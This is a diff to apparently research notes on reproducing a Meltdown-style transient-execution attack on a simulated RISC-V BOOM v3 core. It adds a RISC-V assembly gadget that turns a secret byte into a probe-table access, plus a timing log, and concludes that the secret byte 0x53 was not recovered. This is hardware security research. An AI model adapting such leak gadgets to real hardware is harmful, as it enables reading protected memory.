@@ -1609,6 +1609,43 @@ meltdown-us: done
 real 354.93
 ```
 
+Variant 5 was added to shorten the secret-dependent address chain by using a
+pointer table:
+
+```asm
+lbu  t0, 0(secret_va)
+andi t0, t0, 0xff
+slli t0, t0, 3
+add  t0, t0, probe_ptrs
+ld   t0, 0(t0)
+lb   t1, 0(t0)
+```
+
+This avoids the larger `secret << PROBE_SHIFT` stride calculation used by
+variant 0. Spike smoke passed, but BOOM v3 is still not a clean leak:
+
+```text
+log: targets/boom/logs/MediumBoomV3Config-minios-meltdown-us-pmp-mskip-c1-var5-debugonly-r8-a1.log
+CPUS=1
+MELTDOWN_US_NPROC=4
+MELTDOWN_US_PMP_FAULT=1
+MELTDOWN_US_MMODE_FAULT_SKIP=1
+MELTDOWN_US_GADGET_VARIANT=5
+MELTDOWN_US_TIME_REPS=8
+meltdown-us: timing hit=210 miss=305 threshold=257
+meltdown-us: pmp training value=0x53
+meltdown-us: pmp deny armed
+meltdown-us: raw attempt=0 i53=257 i0=308 i80=256 i1=279 i55=250 i51=251 i56=250 i50=250 i54=250 i52=258
+meltdown-us: fault recovery ok
+meltdown-us: done
+real 376.08
+```
+
+`i53=257` only equals the threshold and is slower than several neighboring
+control buckets (`i55/i56/i50/i54=250`, `i51=251`). This cannot be counted as
+recovering secret byte `0x53`.
+
 So PMP/M-mode-skip is the most promising fault source so far, but only for
 fixed younger-load diagnostics. It still has not propagated the faulting secret
-byte through the dependent address chain strongly enough to recover `0x53`.
+byte through the tested dependent address chains strongly enough to recover
+`0x53`.
